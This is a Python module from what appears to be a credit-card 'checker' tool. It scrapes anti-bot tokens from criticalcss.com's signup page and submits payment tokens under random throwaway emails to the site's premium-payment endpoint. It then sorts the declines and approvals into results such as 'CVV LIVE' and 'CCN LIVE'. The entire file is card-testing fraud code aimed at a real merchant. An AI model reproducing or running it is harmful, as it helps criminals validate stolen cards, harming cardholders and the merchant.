import os
import random
import string
from .rand_user import random_user_api
from ..filters.checker_defs import find_between, remove_html_tags



def one(r, token):
    a = r.get('https://criticalcss.com/signup')
    id = find_between(a.text, 'script async data-chunk="SignupPage" src="/SignupPage-','.')
    if not id: return False
    b = r.get(f'https://criticalcss.com/SignupPage-{id}.js')
    if b.status_code != 200: return False
    protect = find_between(b.text, 'protect:"','"')
    sp = find_between(b.text, 'sp:"','"')
    if not protect or not sp: return False
    email =str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 15))) + '@gmail.com'
    data = {
    "email": email,
    "plan": "price_1HwBoaLYNoSq08J0Q92yIKGh",
    "quantity": 1,
    "customerId": None,
    "protect": protect,
    "paymentMethodId": token,
    "sp": sp
}
    dat = r.post('https://criticalcss.com/api/premium/signup-payment', json = data)
    return dat.json()


#{"customerId":"cus_LF2U9UXs7uKEhg","error":"Your card was declined.","errorCode":"card_declined"}

def get_response_chk(json):
    # if 'error' not in json and 'errorCode' not in json:
    #     r_text, r_logo, r_respo = "Auth Live", "✅", 'CVV LIVE'
    #     return r_text, r_logo, r_respo
    text = find_between(json, 'pmpro_message pmpro_error">', '</div>')
    if "card was declined" in text or 'card_declined' in text or 'The transaction has been declined' in text or 'Processor Declined' in text:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    elif 'Your card number is incorrect' in text or 'Call to a member function attach() on null' in text:
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'Rejected'
    elif 'incorrect_zip' in text or 'Your card zip code is incorrect.' in text or 'The zip code you supplied failed validation' in text or 'card zip code is incorrect' in text:
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'CVV LIVE'
    elif "card has insufficient funds" in text or 'insufficient_funds' in text or 'Insufficient Funds' in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV LIVE'
    elif 'incorrect_cvc' in text or "card's security code is incorrect" in text or "card&#039;s security code is incorrect" in text or "security code is invalid" in text or 'CVC was incorrect' in text or "incorrect CVC" in text or 'cvc was incorrect' in text or 'Card Issuer Declined CVV' in text or 'security code is incorrect' in text:
        r_text, r_logo, r_respo = "CCN LIVE", "✅", 'CCN Match'
    elif "card does not support this type of purchase" in text or 'transaction_not_allowed' in text or 'Transaction Not Allowed' in text:
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'Rejected'
    elif "Customer authentication is required" in text or "unable to authenticate" in text or "three_d_secure_redirect" in text or "hooks.stripe.com/redirect/" in text or 'requires an authorization' in text or 'card_error_authentication_required' in text:
        r_text, r_logo, r_respo = "3D SECURITY", "❌", 'Rejected'
    elif "card has expired" in text or 'Expired Card' in text:
        r_text, r_logo, r_respo = "EXPIRED CARD", "❌", 'Rejected'
    elif 'Donation Confirmation' in json or "This page doesn't seem to exist" in json or 'seller_message": "Payment complete."' in json or '"cvc_check": "pass"' in json or 'thank_you' in json or '"type":"one-time"' in json or '"state": "succeeded"' in json or "Your payment has already been processed" in json or '"status": "succeeded"' in json or 'Thank' in json:
        r_text, r_logo, r_respo = "Auth Live", "✅", 'CVV LIVE'
    else:
            r_text, r_logo, r_respo = 'UNKOWN RESPONSE', "❌", 'Rejected'
    r_text1 = text.strip() if text else r_text
    return r_text1, r_logo, r_respo